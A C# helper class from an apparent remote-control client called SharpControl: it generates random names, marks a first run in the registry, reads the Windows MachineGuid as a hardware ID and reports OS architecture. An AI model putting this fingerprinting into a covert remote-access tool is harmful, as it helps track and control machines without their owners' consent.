using System;
using Microsoft.Win32;

namespace RemoteControl
{
    class helpers
    {
        public static string gen_name(int num)
        {
            var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var name_len = new char[num];
            var random = new Random();

            for (int i = 0; i < name_len.Length; i++)
            {
                name_len[i] = alphabet[random.Next(alphabet.Length)];
            }

            var rezult = new String(name_len);

            return rezult;
        }

        public static bool first_run()
        {
            string key_name = "Software\\SharpControl";
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(key_name))
            {
                if (key != null)
                {
                    return false;
                }
                else
                {
                    using (Registry.CurrentUser.CreateSubKey(key_name))
                    {
                        return true;
                    }
                }
            }
        }

        public static string hwid()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography"))
            {
                if (key != null)
                {
                    object o = key.GetValue("MachineGuid");
                    if (o != null)
                    {
                        return o.ToString();
                    }
                    else
                    {
                        return gen_name(10);
                    }
                }
                else
                {
                    return gen_name(10);
                }
            }
        }

        public static string arch()
        {
            return ((Environment.Is64BitOperatingSystem) ? "64" : "32");
        }
    }
}
